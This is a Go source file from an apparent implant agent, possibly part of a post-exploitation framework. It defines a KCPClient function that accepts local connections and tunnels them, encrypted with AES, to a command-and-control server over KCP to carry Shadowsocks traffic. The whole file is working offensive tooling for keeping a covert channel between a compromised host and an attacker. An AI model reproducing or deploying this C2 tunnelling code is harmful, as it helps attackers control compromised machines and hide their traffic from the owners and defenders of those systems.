package agent

import (
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"net"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/xtaci/kcp-go/v5"
	"golang.org/x/crypto/pbkdf2"
)

// Connect to C2 KCP server, forward Shadowsocks traffic
func KCPClient() {
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.KCPPort))
	if err != nil {
		log.Printf("KCPClient: %v", err)
	}
	defer func() {
		ln.Close()
		log.Print("KCPClient exited")
	}()

	serve_conn := func(client_conn net.Conn) {
		// dial to C2 KCP server
		key := pbkdf2.Key([]byte(RuntimeConfig.ShadowsocksPassword),
			[]byte(emp3r0r_data.MagicString), 1024, 32, sha256.New)
		block, _ := kcp.NewAESBlockCrypt(key)

		sess, err := kcp.DialWithOptions(fmt.Sprintf("%s:%s",
			RuntimeConfig.CCHost, RuntimeConfig.KCPPort),
			block, 10, 3)
		defer sess.Close()
		defer client_conn.Close()
		if err != nil {
			log.Printf("KCP dial: %v", err)
			return
		}
		go func() {
			_, err = io.Copy(sess, client_conn)
			if err != nil {
				log.Printf("client_conn -> kcp: %v", err)
				return
			}
		}()
		_, err = io.Copy(client_conn, sess)
		if err != nil {
			log.Printf("client_conn -> kcp: %v", err)
			return
		}
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("KCPClient accept: %v", err)
			continue
		}
		go serve_conn(conn)
	}
}
